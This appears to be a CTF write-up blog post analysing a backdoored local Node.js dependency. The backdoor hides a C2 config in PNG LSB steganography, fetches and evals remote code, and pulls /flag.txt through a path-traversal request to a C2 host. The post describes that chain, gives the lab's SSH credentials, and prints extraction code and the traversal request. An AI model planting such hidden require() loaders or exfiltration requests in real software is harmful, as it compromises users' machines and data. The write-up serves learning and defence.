---
layout: post
title: "SHC 2026: Stegosaurus - LSB Steganography + C2 Emulation"
date: 2026-05-08
tags: [misc]
---

## Challenge Overview

SSH access provided to a Node.js web server running as root. Flag at `/flag.txt`.
SSH credentials: `dino:Stegosaurus-4-life`

## Step 1: Initial Reconnaissance

```bash
id          # uid=1001(dino) — not root
ps aux      # Node.js process (PID 9) running as root
ls /opt/dinosite/
# server.js, package.json, public/, node_modules/
```

Server runs on port 3000. `package.json` revealed a suspicious local dependency:

```json
"dinoraww": "file:../dinoraww"
```

## Step 2: Analyzing the Backdoor

`/opt/dinoraww/index.js` exports harmless dinosaur sounds — but the last line:

```javascript
require('./lib/loader.js');
```

`loader.js` is the real backdoor. It defines:

- `wonderingIfDinosWouldLikeBacon()` — extracts hidden bytes from PNG IDAT chunks via **LSB of the blue channel**
- `xorDecrypt()` — simple XOR decryption
- `RAAAAAAAAAAAAAAAAAAAAW()` — orchestrates secret extraction:
  - Reads `trex.png`, `raptor.png`, `ptero.png` — extracts **32 bytes each**
  - XORs the three shares — **32-byte key** (`kek`)
  - Extracts **123 bytes** from `stego.png` — XOR-decrypts with `kek`
  - Parses result as JSON to get C2 server config
- `doTheRaaaaw()` — fetches `/algo` from C2, evaluates it, then exfiltrates flag via path traversal

## Step 3: Recovering the Key (kek)

Replicated the LSB extraction locally:

```javascript
function extractBytes(imgPath, bytesToExtract) {
  // Parse PNG IDAT chunks, decompress DEFLATE
  // Extract LSB of blue channel from each pixel
  // Pack bits into bytes
}

const shares = ['trex.png', 'raptor.png', 'ptero.png']
  .map(f => extractBytes(f, 32));

let kek = Buffer.alloc(32);
shares.forEach(share => {
  for (let i = 0; i < 32; i++) kek[i] ^= share[i];
});
```

## Step 4: Decrypting C2 Config

```javascript
const stegoData = extractBytes('stego.png', 123);
const config = JSON.parse(xorDecrypt(stegoData, kek).toString('utf8'));
// Output:
// { host: "c2", port: 2137, endpoint: "/receive_the_greatest_dino",
//   protocol: "http", file_param: "file", target: "flag.txt" }
```

C2 hostname `c2` resolved to `10.0.100.163` inside the Kubernetes cluster.

## Step 5: Fetching the Decryption Algorithm

The backdoor fetches `/algo` from C2, decrypts with `kek`, and evals it.
Emulated this to recover `decryptTraffic()` — AES-256-CBC with key `SHA256(kek + 'traffic_key')`.

## Step 6: Getting the Flag

```javascript
const reqPath = `${config.endpoint}?${config.file_param}=/flag.txt`;
// GET http://10.0.100.163:2137/receive_the_greatest_dino?file=/flag.txt
// → response: encrypted flag bytes
// → decryptTraffic(response, kek) → flag
```

**Flag:** `shc2026{...}`

## Key Takeaways

- Always inspect custom Node.js modules for hidden `require()` calls.
- LSB steganography in PNGs is reversible with knowledge of image dimensions and channel used.
- When a backdoor fetches and evals remote code, you can replicate that flow to get the same data.
